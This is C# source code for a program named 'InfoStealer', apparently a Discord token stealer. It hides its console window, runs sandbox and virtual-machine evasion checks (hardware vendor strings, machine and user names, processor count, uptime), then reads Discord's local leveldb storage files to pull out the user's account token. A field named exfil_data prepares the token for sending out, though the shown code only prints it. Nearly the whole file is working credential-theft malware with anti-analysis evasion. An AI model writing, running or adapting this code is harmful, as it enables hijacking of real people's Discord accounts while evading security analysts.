using System;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace InfoStealer
{
	internal class Program
	{
		// Setup Hidden window
		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		const int SW_HIDE = 0;
		const int SW_SHOW = 5;

		struct s_data
		{
			public string file_data;
			public string file_type;
		}

		static bool is_VM()
		{

			// Check Manufacturer Strings
			try
			{
				var man_searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
				var man_items = man_searcher.Get();
				foreach (var man_item in man_items)
				{
					string manufacturer = man_item["Manufacturer"].ToString().ToLower();
					if ((manufacturer == "microsoft corporation" && man_item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
						|| manufacturer.Contains("vmware")
						|| man_item["Model"].ToString() == "VirtualBox")
					{
						return true;
					}
				}
			}
			catch { }

			try {
				string PC_Name = Environment.MachineName.ToUpperInvariant();
				if (PC_Name.Contains("VM") || PC_Name.Contains("VIRTUAL") || PC_Name.Contains("DEFEND")) return true;       // Check machine name strings
			} catch { }

			try { 
				string User_Name = Environment.UserName.ToUpperInvariant();
				if (User_Name.Contains("VM") || User_Name.Contains("VIRTUAL") || User_Name.Contains("DEFEND")) return true;     // Check Username strings
			} catch { }

			try { 
				if (Environment.ProcessorCount <= 2) return true;																// If less than 2 Processor cores
				if (Environment.TickCount <= 1000) return true;                                                                 // Time since computer started
			} catch { }

			// !TODO: Check total system memory

			return false;
		}
		
		static s_data discord_token()
		{
			int offset = 0;
			string token = "";
			s_data exfil_data = new s_data();
			exfil_data.file_type = "Discord Account Token";
			// get list of every file in %appdata%\discord\...
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\");
			foreach (var file in files)
			{
				if (File.ReadAllText(file).Contains("token"))
				{
					string token_file_string = File.ReadAllText(file);
					int token_index = token_file_string.IndexOf("token\u0001I\n\u0005");
					while (token_file_string[token_index + offset] != '\"') offset++;       // reach first "
					offset++;
					while (token_file_string[token_index + offset] != '\"')
					{
						token += token_file_string[token_index + offset];
						offset++;
					}
					break;
				}
			}
			exfil_data.file_data = token;
			return exfil_data;
		}

		public static int Main(string[] args)
		{
			if (is_VM()) return 255; 

			// Hide Window
			var handle = GetConsoleWindow();
			ShowWindow(handle, SW_HIDE);
			s_data discordToken = discord_token();
			Console.WriteLine(discordToken.file_type);
			Console.WriteLine(discordToken.file_data);
			System.Threading.Thread.Sleep(10000);
			return 0;
		}
	}
}
